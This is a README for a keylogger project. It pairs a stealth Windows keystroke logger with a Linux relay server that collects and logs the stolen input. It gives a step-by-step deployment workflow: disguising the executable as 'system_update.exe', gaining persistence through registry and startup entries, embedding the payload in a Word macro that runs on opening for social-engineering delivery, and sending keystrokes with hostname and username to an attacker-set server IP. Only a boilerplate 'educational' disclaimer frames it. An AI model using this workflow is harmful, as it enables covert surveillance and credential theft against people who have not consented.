# Aetriks: Cybersecurity Keylogger Project

A comprehensive cybersecurity research project consisting of a Python keylogger for Windows targets and a Java Spring Boot relay server for Linux hosts.

**DISCLAIMER**: This project is for **educational and research purposes only**! Do not use it for any illegal activities. Misuse of this tool is your responsibility. Always ensure you have explicit permission before testing on any device.

---

## Project Architecture

```
┌─────────────────┐    HTTP POST    ┌──────────────────┐
│   Windows PC    │ ──────────────► │   Linux Server   │
│   (Target)      │                 │   (Host)         │
│                 │                 │                  │
│ Single Executable│                 │ Spring Boot API  │
│ (Stealth Mode)  │                 │ (Data Logger)    │
└─────────────────┘                 └──────────────────┘
                                              │
                                              ▼
                                    ┌──────────────────┐
                                    │   Log Files      │
                                    │ keyboard_capture │
                                    │ .txt             │
                                    └──────────────────┘
```

---

## Quick Start

### Prerequisites

- **Linux Host Server**: Java 17+, Maven
- **Windows Target**: No prerequisites (single executable)
- **Network**: Both components need network connectivity

### 1. Set Up Linux Host Server

```bash
# Clone the repository
git clone https://github.com/frHimanshu/aetriks-relay.git
cd aetriks-relay

# Build and run the relay server
cd relay-server
mvn clean install
mvn spring-boot:run
```

The server will start on `http://localhost:8080`

### 2. Configure Keylogger for Windows Deployment

```bash
# Navigate to keylogger directory
cd keylogger

# Edit configuration with your Linux server IP
# Update config.json with your server's IP address
```

### 3. Generate Single-File Windows Executable

```bash
# Create single-file stealth executable
python deploy_generator.py
```

This creates:
- `dist/system_update.exe` - Single executable (no dependencies)
- `system_update.vba` - Document-based payload
- `DEPLOYMENT_INSTRUCTIONS.txt` - Deployment guide

### 4. Deploy to Windows Target

**Simple Deployment**: Just copy and run the single executable!
- Copy `system_update.exe` to target Windows PC
- Run as administrator for persistence
- Executable runs silently in background

---

## Key Features

### Windows Keylogger (Target)
- **Single executable file** - no dependencies or additional files
- Configuration embedded in executable
- Real-time keystroke capture with stealth operation
- Automatic persistence and startup capabilities
- Configurable transmission intervals
- Background operation with minimal system impact
- F12 key to stop operation (stealth mode)

### Linux Relay Server (Host)
- RESTful API endpoints for data reception
- Real-time keystroke logging to file
- Web interface for viewing captured data
- Configurable server settings
- Cross-platform compatibility
- Comprehensive error handling

### Deployment System
- Single-file executable generation
- Embedded configuration
- Multiple deployment strategies
- Professional documentation

---

## Configuration

### Keylogger Configuration (`keylogger/config.json`)

```json
{
    "ip_address": "YOUR_LINUX_SERVER_IP",
    "port_number": 8080,
    "time_interval": 10,
    "stealth_mode": true,
    "persistence": true,
    "log_file": "system_log.txt"
}
```

### Server Configuration (`relay-server/src/main/resources/application.properties`)

```properties
server.port=8080
server.address=0.0.0.0
logging.file.name=logs/aetriks-relay.log
```

---

## Deployment Options

### 1. Direct Executable Deployment (Recommended)
- Build single executable using deployment generator
- Copy `system_update.exe` to Windows target
- Run as administrator for persistence
- **No additional files required!**

### 2. Document-Based Deployment
- Convert executable to VBA code
- Embed in Word document (`.docm` format)
- Auto-execution on document opening
- Stealth deployment through social engineering

---

## Security Features

### Stealth Operation
- No console window or visible interface
- Creates legitimate-looking log files
- Minimal system resource usage
- Background operation

### Persistence Mechanisms
- Registry-based startup entries
- Startup folder placement
- Administrator privilege detection
- Automatic restart capabilities

### Data Transmission
- Configurable transmission intervals
- Error handling and reconnection
- Metadata inclusion (hostname, username, timestamp)
- Session tracking

---

## Development

### Adding New Features

1. **Keylogger Enhancements**:
   - Add new capture methods in `keylogger/keylogger.py`
   - Update configuration schema in `config.json`
   - Test with the relay server

2. **Relay Server Enhancements**:
   - Add new endpoints in `relay-server/src/main/java/com/aetriks/relay/controller/`
   - Update models in `relay-server/src/main/java/com/aetriks/relay/model/`
   - Modify logging behavior in `KeyLogController.java`

### Testing

```bash
# Test relay server
curl -X POST http://localhost:8080/api/keystrokes \
  -H "Content-Type: application/json" \
  -d '{"keyboardData":"test keystrokes"}'

# View logs
curl http://localhost:8080/
```

---

## Requirements

### Linux Host Dependencies
- Java 17+
- Maven 3.6+
- Spring Boot 3.2.0

### Windows Target Dependencies
- **No dependencies required** (single executable)
- Administrator privileges for persistence features

### Development Dependencies
```
pynput==1.7.6
requests==2.31.0
pyinstaller==5.13.0
pywin32==306
```

---

## Security Considerations

1. **Network Security**: Use HTTPS in production environments
2. **Authentication**: Implement proper authentication mechanisms
3. **Data Encryption**: Encrypt sensitive data in transit and at rest
4. **Access Control**: Restrict access to logged data
5. **Legal Compliance**: Ensure compliance with local laws and regulations

---

## Contributing

Please read our [Contributing Guide](docs/CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.

### Development Guidelines

- Follow existing code style and conventions
- Add appropriate documentation for new features
- Include tests for new functionality
- Update README.md for significant changes

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## Legal Notice

This software is provided for educational and research purposes only. Users are responsible for ensuring they have proper authorization before using this tool on any system. The authors are not responsible for any misuse of this software.

---

## Contact

- **Discord**: `_himanshu__`
- **GitHub**: [frHimanshu](https://github.com/frHimanshu)

---

## Version History

- **v1.0.0**: Initial release with basic keylogger and relay server
- **v1.1.0**: Added VBA conversion capability
- **v1.2.0**: Consolidated repository structure and improved documentation
- **v1.3.0**: Enhanced stealth capabilities and Linux host/Windows target architecture
- **v1.4.0**: Single-file executable deployment with embedded configuration
